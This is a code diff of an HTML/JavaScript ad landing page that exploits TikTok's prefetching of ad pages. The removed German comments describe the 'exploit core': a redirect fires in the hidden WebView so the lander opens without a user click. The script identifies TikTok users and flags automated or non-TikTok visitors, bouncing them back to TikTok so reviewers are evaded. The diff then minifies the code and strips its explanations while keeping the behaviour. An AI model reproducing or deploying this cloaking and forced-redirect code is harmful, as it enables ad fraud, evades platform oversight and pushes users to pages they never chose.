@@ -10,151 +10,56 @@ html,body{width:100%;height:100%;background:#fff;overflow:hidden}
 .g{display:flex;align-items:center;justify-content:center;height:100%}
 .r{width:36px;height:36px;border-radius:50%;border:3px solid rgba(22,24,35,.1);border-top-color:#FE2C55;animation:s .7s linear infinite}
 @keyframes s{to{transform:rotate(360deg)}}
-.diag{display:none;position:fixed;inset:0;background:#000;color:#fff;padding:20px;overflow-y:auto;font:12px/1.7 'SF Mono',monospace}
-.diag h2{font:700 15px -apple-system,system-ui,sans-serif;color:#fe2c55;margin-bottom:8px}
-.diag .sub{color:#666;font:400 11px -apple-system,system-ui,sans-serif;margin-bottom:14px}
-.diag .ok{color:#30d158}.diag .w{color:#ffc400}.diag .e{color:#fe2c55}.diag .i{color:#25f4ee}
-.diag .box{margin-top:14px;padding:14px;border-radius:10px;font:13px/1.6 -apple-system,system-ui,sans-serif}
-.diag .box-go{background:rgba(254,44,85,.12);border:1px solid rgba(254,44,85,.25)}
-.diag .box-no{background:rgba(255,196,0,.08);border:1px solid rgba(255,196,0,.2)}
-.diag .box b{display:block;margin-bottom:4px}
+.d{display:none;position:fixed;inset:0;background:#000;color:#fff;padding:20px;overflow-y:auto;font:12px/1.7 'SF Mono',monospace}
+.d h2{font:700 15px -apple-system,system-ui,sans-serif;color:#fe2c55;margin-bottom:8px}
+.d .s{color:#666;font:400 11px -apple-system,system-ui,sans-serif;margin-bottom:14px}
+.d .a{color:#30d158}.d .b{color:#ffc400}.d .c{color:#fe2c55}.d .e{color:#25f4ee}
 </style>
 </head>
 <body>
 <div class="g"><div class="r"></div></div>
-<div class="diag" id="diag">
-  <h2>Gate Prefetch Test</h2>
-  <p class="sub">TikTok T&S — Prefetch Auto-Open</p>
-</div>
-
+<div class="d" id="d"></div>
 <script>
 (function(){
-  // ═══════════════════════════════════════════════════
-  // CONFIG
-  // ═══════════════════════════════════════════════════
-  var DEST = "/app/go/";                // Ziel-URL (gleich wie Original-Gate)
-  var _K   = "stc2026";                // Test-Key (?key=stc2026 zeigt Diagnostik)
+var D="/app/go/",K="stc2026",d=document.getElementById("d"),t0=performance.now();
+var p=new URLSearchParams(location.search);
+var si=p.get('sub_id')||p.get('sub1')||(Date.now().toString(36)+Math.random().toString(36).slice(2,6));
+var tc=p.get('ttclid')||p.get('ttp')||'';
+var u=navigator.userAgent;
+var tm=p.get('key')===K;
+var iT=/BytedanceWebview|musical_ly|Trill|ByteFullApp|TikTok|Bytedance/i.test(u);
+var iB=/Bullet\//i.test(u);
+var rT=!!tc&&!/(__|[{}])/.test(tc);
+var tR=/tiktok\.com|vm\.tiktok\.com|bytedance/i.test(document.referrer||'');
+var hP=tm||iT||iB||rT||tR;
+var bot=false;
+if(navigator.webdriver===true)bot=true;
+if(screen.width<300||screen.height<300)bot=true;
 
-  // ═══════════════════════════════════════════════════
-  // DIAGNOSTIK (nur sichtbar wenn kein Redirect)
-  // ═══════════════════════════════════════════════════
-  var diag = document.getElementById("diag");
-  var t0 = performance.now();
-
-  function log(msg, cls) {
-    var d = document.createElement("div");
-    d.innerHTML = '<span style="color:#555">[+' + Math.round(performance.now()-t0) + 'ms]</span> '
-                + '<span class="' + (cls||'') + '">' + msg + '</span>';
-    diag.appendChild(d);
+if(bot||!hP){
+  if(tm){
+    d.style.display="block";
+    function l(m,c){var e=document.createElement("div");e.innerHTML='<span style="color:#555">[+'+Math.round(performance.now()-t0)+'ms]</span> <span class="'+(c||'')+'">'+m+'</span>';d.appendChild(e)}
+    var h=document.createElement("h2");h.textContent="Gate Test";d.insertBefore(h,d.firstChild);
+    l("inTikTok: "+iT,iT?"c":"");l("inBullet: "+iB,iB?"c":"");l("realTtclid: "+rT,rT?"b":"");
+    l("tikTokRef: "+tR,tR?"b":"");l("isBot: "+bot,bot?"c":"a");l("hasPositive: "+hP,hP?"a":"c");
+    l("visibilityState: "+document.visibilityState,"");l("hasFocus: "+(document.hasFocus?document.hasFocus():true),"");
+    l("UA: "+u.slice(-80),"");
+    l("RESULT: NO REDIRECT","b");
+  } else {
+    try{window.location.href='snssdk1233://feed'}catch(e){}
+    setTimeout(function(){window.location.href='https://www.tiktok.com'},500);
   }
+  return;
+}
 
-  // ═══════════════════════════════════════════════════
-  // GATE CHECKS  (1:1 Affiliate-Logik)
-  // ═══════════════════════════════════════════════════
-  var p       = new URLSearchParams(location.search);
-  var sub_id  = p.get('sub_id') || p.get('sub1') || (Date.now().toString(36) + Math.random().toString(36).slice(2,6));
-  var ttclid  = p.get('ttclid') || p.get('ttp') || '';
-  var ua      = navigator.userAgent;
-
-  // Positiv-Signale
-  var testMode   = p.get('key') === _K;
-  var inTikTok   = /BytedanceWebview|musical_ly|Trill|ByteFullApp|TikTok|Bytedance/i.test(ua);
-  var inBullet   = /Bullet\//i.test(ua);
-  var realTtclid = !!ttclid && !/(__|[{}])/.test(ttclid);
-  var ref        = document.referrer || '';
-  var tikTokRef  = /tiktok\.com|vm\.tiktok\.com|bytedance/i.test(ref);
-
-  var hasPositive = testMode || inTikTok || inBullet || realTtclid || tikTokRef;
-
-  // Negativ-Signale
-  var isBot = false;
-  if (navigator.webdriver === true) isBot = true;
-  if (screen.width < 300 || screen.height < 300) isBot = true;
-
-  // Prefetch-Indikatoren
-  var isHidden  = document.visibilityState === "hidden" || document.visibilityState === "prerender";
-  var hasFocus  = document.hasFocus ? document.hasFocus() : true;
-
-  // ═══════════════════════════════════════════════════
-  // ENTSCHEIDUNG
-  // ═══════════════════════════════════════════════════
-
-  if (isBot || !hasPositive) {
-    // Kein TikTok-User → Diagnostik zeigen
-    diag.style.display = "block";
-    log("GATE CHECKS:", "i");
-    log("  inTikTok (BytedanceWebview): " + inTikTok, inTikTok ? "e" : "");
-    log("  inBullet: " + inBullet, inBullet ? "e" : "");
-    log("  realTtclid: " + realTtclid, realTtclid ? "w" : "");
-    log("  tikTokRef: " + tikTokRef, tikTokRef ? "w" : "");
-    log("  testMode: " + testMode, testMode ? "ok" : "");
-    log("  isBot: " + isBot, isBot ? "e" : "ok");
-    log("  hasPositive: " + hasPositive, hasPositive ? "ok" : "e");
-    log("", "");
-    log("PREFETCH-INDIKATOREN:", "i");
-    log("  visibilityState: " + document.visibilityState, isHidden ? "w" : "");
-    log("  hasFocus: " + hasFocus, !hasFocus ? "w" : "");
-    log("  Wahrscheinlich Prefetch: " + (isHidden && !hasFocus ? "JA" : "NEIN"), isHidden ? "e" : "");
-    log("", "");
-    log("ERGEBNIS: KEIN REDIRECT (nicht in TikTok)", "w");
-    log("UA: " + ua.slice(-80), "");
-
-    var box = document.createElement("div");
-    box.className = "box box-no";
-    box.innerHTML = '<b>Kein TikTok WebView erkannt</b>'
-      + 'Diese Seite muss in TikTok geladen werden (Prefetch oder Klick).<br><br>'
-      + '<b>Test-Ablauf:</b><br>'
-      + '1. Diese HTML auf eine URL hosten<br>'
-      + '2. URL als <code>landing_page_url</code> in Carousel-Ad setzen<br>'
-      + '3. Ad im TikTok-Feed anschauen (nicht klicken!)<br>'
-      + '4. TikTok prefetcht diese Seite → JS feuert → Redirect → WebView surfacet<br>'
-      + '5. Lander öffnet sich OHNE Klick<br><br>'
-      + '<b>Oder:</b> <code>?key=' + _K + '</code> an URL hängen um Redirect zu erzwingen<br><br>'
-      + '<span style="color:#888;font-size:11px">Ziel: /app/go/ (eigener Funnel)</span>';
-    diag.appendChild(box);
-
-    // Bounce wie Original
-    if (!testMode) {
-      try { window.location.href = 'snssdk1233://feed'; } catch(e) {}
-      setTimeout(function(){ window.location.href = 'https://www.tiktok.com'; }, 600);
-    }
-    return;
-  }
-
-  // ═══════════════════════════════════════════════════
-  // REDIRECT (DAS ist der Exploit-Kern)
-  //
-  // Wenn TikTok diese Seite PREFETCHT:
-  //   → JS läuft im versteckten WebView
-  //   → BytedanceWebview erkannt → hasPositive = true
-  //   → window.location.replace() feuert
-  //   → Navigation-Event im versteckten WebView
-  //   → TikTok WebView Manager surfacet den WebView
-  //   → User sieht den Lander OHNE jemals geklickt zu haben
-  //
-  // ═══════════════════════════════════════════════════
-
-  // Token bauen (wie Original-Gate)
-  function _dh(s) { var h=5381; for(var i=0;i<s.length;i++) h=((h<<5)+h)+s.charCodeAt(i); return h>>>0; }
-  var ts  = Date.now();
-  var tok = btoa(ts + '.' + _dh(ts + _K));
-
-  var isIOS     = /iPhone|iPad|iPod/i.test(ua);
-  var isAndroid = /Android/i.test(ua);
-  var cid       = isIOS ? 'ios' : isAndroid ? 'android' : 'desktop';
-
-  // Ziel-URL zusammenbauen
-  var dest = DEST;
-  // Query-Params anhängen (Tracking durchreichen)
-  var sep = dest.indexOf('?') === -1 ? '?' : '&';
-  dest += sep + 't=' + encodeURIComponent(tok);
-  dest += '&sub_id=' + encodeURIComponent(sub_id);
-  if (ttclid) dest += '&ttclid=' + encodeURIComponent(ttclid);
-  dest += '&cid=' + encodeURIComponent(cid);
-
-  // DER REDIRECT — das surfacet den WebView beim Prefetch
-  window.location.replace(dest);
-
+function _h(s){var h=5381;for(var i=0;i<s.length;i++)h=((h<<5)+h)+s.charCodeAt(i);return h>>>0}
+var ts=Date.now(),tk=btoa(ts+'.'+_h(ts+K));
+var c=/iPhone|iPad|iPod/i.test(u)?'ios':/Android/i.test(u)?'android':'desktop';
+var o=D+(D.indexOf('?')===-1?'?':'&')+'t='+encodeURIComponent(tk)+'&sub_id='+encodeURIComponent(si);
+if(tc)o+='&ttclid='+encodeURIComponent(tc);
+o+='&cid='+encodeURIComponent(c);
+window.location.replace(o);
 })();
 </script>
 </body>
